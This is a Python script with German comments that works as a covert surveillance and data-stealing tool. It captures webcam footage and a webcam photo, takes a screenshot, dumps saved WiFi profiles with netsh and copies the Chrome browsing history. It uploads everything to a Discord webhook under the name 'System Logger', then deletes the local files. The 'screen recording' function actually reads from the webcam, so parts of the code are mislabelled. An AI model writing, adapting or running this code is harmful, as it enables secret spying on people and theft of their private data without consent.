import requests
import cv2
import numpy as np
import os
import pyautogui
import subprocess
import json
from datetime import datetime

# Webhook URL
webhook_url = 'https://discord.com/api/webhooks/your_webhook_url'

def capture_screen_recording(output_path, duration=30):
    # Bildschirmaufnahme-Einstellungen
    screen_width = 1920  # Anpassen je nach Bildschirmauflösung
    screen_height = 1080
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    fps = 20.0

    # VideoWriter-Objekt erstellen
    out = cv2.VideoWriter(output_path, fourcc, fps, (screen_width, screen_height))

    # Bildschirmaufnahme starten
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    start_time = datetime.now()

    while (datetime.now() - start_time).seconds < duration:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)

    cap.release()
    out.release()

def capture_screenshot(output_path):
    screenshot = pyautogui.screenshot()
    screenshot.save(output_path)

def capture_webcam_image(output_path):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(output_path, frame)
    cap.release()

def get_wifi_info(output_path):
    # Führt den netsh-Befehl aus, um WLAN-Informationen zu erhalten
    wifi_info = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True).stdout.decode()
    
    with open(output_path, 'w') as f:
        f.write(wifi_info)

def get_browser_history(output_path):
    # Beispiel für Google Chrome Browser-Verlauf (kann angepasst werden)
    history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
    copy_history = output_path

    if os.path.exists(history_path):
        # Kopieren der Browser-History-Datei (Datenbank)
        with open(history_path, 'rb') as f:
            data = f.read()
        with open(copy_history, 'wb') as f:
            f.write(data)

def send_files_to_discord(files):
    # Mit der Discord-API verbinden
    with requests.Session() as session:
        response = session.post(
            webhook_url,
            files=files,
            data={'username': 'System Logger'}
        )

        if response.status_code == 204:
            print('Dateien erfolgreich gesendet.')
        else:
            print(f'Fehler beim Senden der Dateien: {response.status_code}')
            print(response.text)  # Gibt den Fehlertext aus

def main():
    # Pfade für Dateien
    screen_recording_path = 'screen_recording.mp4'
    screenshot_path = 'screenshot.png'
    webcam_image_path = 'webcam_image.png'
    wifi_info_path = 'wifi_info.txt'
    browser_history_path = 'browser_history.txt'

    # 30-sekündige Bildschirmaufnahme
    capture_screen_recording(screen_recording_path, duration=30)
    
    # Screenshot des Bildschirms
    capture_screenshot(screenshot_path)
    
    # Webcam-Bild aufnehmen
    capture_webcam_image(webcam_image_path)
    
    # WLAN-Informationen abrufen
    get_wifi_info(wifi_info_path)
    
    # Browser-Verlauf abrufen
    get_browser_history(browser_history_path)

    # Dateien für die Übertragung vorbereiten
    files = {
        'screen_recording.mp4': open(screen_recording_path, 'rb'),
        'screenshot.png': open(screenshot_path, 'rb'),
        'webcam_image.png': open(webcam_image_path, 'rb'),
        'wifi_info.txt': open(wifi_info_path, 'rb'),
        'browser_history.txt': open(browser_history_path, 'rb'),
    }

    # Dateien an Discord senden
    send_files_to_discord(files)

    # Aufräumen
    for file in files:
        files[file].close()
        os.remove(file)

if __name__ == "__main__":
    main()
